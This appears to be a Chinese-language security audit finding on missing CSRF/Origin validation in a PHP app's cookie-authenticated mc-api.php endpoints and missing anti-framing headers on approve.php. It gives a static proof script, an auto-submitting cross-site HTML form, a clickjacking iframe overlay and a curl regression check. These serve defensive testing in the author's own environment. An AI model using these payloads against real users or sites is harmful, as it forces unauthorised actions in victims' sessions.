# APPAPI-03 [P2] Cookie 认证的写接口（mc-api approve_link/submit）无 CSRF/Origin 校验，v2.1 只修了 api.php

- 级别：P2 中
- 类别：CSRF / 配置错误（安全控制覆盖不全）
- 可信度：确认（服务端无校验为代码事实；能否跨站利用取决于浏览器 SameSite 与同站子域）
- 复现级别：R3（端到端需真实浏览器；poc.py 完成静态证明并退出码 2）

## 环境要求

- 本机：Windows + Python 3.12（BRIEF 指定解释器），`poc.py` 只做静态证明。
- 端到端（R3）需要：真实浏览器 + 已登录会话 + 测试部署（或同站子域注入点）。
- **不要对生产 chat.lzj2012.top 执行任何报文。**

## 运行命令

在本机（Windows）执行：

```
cd D:\Desktop\新建文件夹
python work\repro\php-app-api\APPAPI-03\poc.py
```

本机解释器路径（BRIEF 指定）：

```
C:\Users\18012\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\python\python.exe work\repro\php-app-api\APPAPI-03\poc.py
```

无需 PHP / MySQL / nginx；脚本只用 Python 标准库。若 `work/src` 不存在，脚本会自动跳过"源码核对"部分（R1 语义模拟结论不受影响）。

## 期望输出（关键行）

```
== 1) 静态证明：mc-api.php 没有任何 Origin/Referer 校验
   mc-api.php 含 HTTP_ORIGIN = False；含 HTTP_REFERER = False
   对照 api.php 含 HTTP_ORIGIN = True（api.php:8-17，v2.1 唯一实现处）
== 2) 静态证明：两个 Cookie 认证的写操作
   approve_link 需要登录(require_login)=True；写操作(INSERT/UPDATE)=True；Origin 校验=False
   submit       需要登录(require_login)=True；写操作(INSERT/UPDATE)=True；Origin 校验=False
== 3) 静态证明：approve.php 无防套框头
   含 X-Frame-Options = False；含 CSP = False
...
RESULT: NEEDS-REAL-ENV（退出码 2）
```

## 判定标准

静态判定：退出码 **2** 且输出中 `Origin 校验=False`（两行）与 `对照 api.php 含 HTTP_ORIGIN = True`。

端到端（R3）判定：在**自有测试环境**用下面报文，若返回 200 且 `mc_bindings` 新增记录，
则"无来源校验可被跨站利用"复现成功；修复后同样报文返回 403 `跨站请求被拒绝`。

## 实际输出

见同目录 `actual-output.txt`（本机真实运行结果，命令即上文）。

## 完整端到端（真实环境 / R3，未在本机执行）

以下报文仅供运维/下游在**自有测试环境**执行，本机未执行、禁止对生产发起。

### 4.1 浏览器跨站 PoC（保存为 evil.html，用测试域名的受害者浏览器打开）

```html
<!-- 前提：受害者在 <测试域名> 已登录；替换 <TEST-TOKEN> 为测试环境里的一条待审批 12hex 链接令牌 -->
<form id="f" method="POST" action="https://<测试域名>/mc-api.php?action=approve_link">
  <input name="t" value="<TEST-TOKEN>">
</form>
<script>document.getElementById('f').submit();</script>
```

- 期望（未修复）：请求被以受害者身份处理，HTTP 200 `{"ok":true,...}`，`mc_bindings` 出现该游戏名。
- 修复后期望：HTTP 403 `跨站请求被拒绝`。
- 说明：现代浏览器对 `SameSite=Lax` 的 host-only Cookie 会拦截**跨站** POST，因此该 PoC 主要对
  "同站子域（`*.lzj2012.top`）发起的请求""未实现 SameSite 的旧客户端"成立；这正是仍必须做
  Origin 校验的原因（Cookie 的 SameSite 不是服务端可控的保证）。

### 4.2 点击劫持辅助向量（approve.php 无 frame-ancestors）

```html
<iframe src="https://<测试域名>/v/<TEST-TOKEN>" style="width:420px;height:520px;opacity:0.01"></iframe>
```

把 iframe 叠在诱导按钮上，让已登录用户点击"在网页端批准"。

### 4.3 修复后回归

```
curl -i -X POST 'https://<测试域名>/mc-api.php?action=approve_link' \
  -H 'Origin: https://evil.example' -b 'chq=<受害者会话>' -d 't=<TEST-TOKEN>'
```

期望：HTTP 403；带 `Origin: https://<测试域名>` 的同一请求仍 200。
